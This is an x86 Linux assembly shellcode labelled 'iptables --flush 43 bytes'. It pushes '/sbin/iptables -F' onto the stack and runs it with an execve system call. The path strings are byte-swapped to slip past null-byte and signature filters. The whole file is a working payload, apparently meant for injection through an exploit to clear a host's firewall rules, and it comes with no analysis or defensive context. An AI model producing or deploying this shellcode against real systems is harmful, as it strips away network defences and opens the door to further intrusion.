; Linux/x86 iptables --flush 43 bytes

global _start

section .text
_start:
      push byte 10
      pop eax
      cdq
      push edx
      push word 0x462d
      mov ecx, esp
      push edx
      push word 0x7365

;      push 0x6c626174
      mov ebx,0x7461626c
      bswap ebx
      push ebx

;      push 0x70692f6e
       mov ebx,0x6e2f6970
       bswap ebx
       push ebx

;      push 0x6962732f
       mov ebx,0x2f736269
       bswap ebx
       push ebx

      inc eax
      mov ebx, esp
      push edx
      push ecx
      push ebx
      mov ecx, esp
      int 0x80
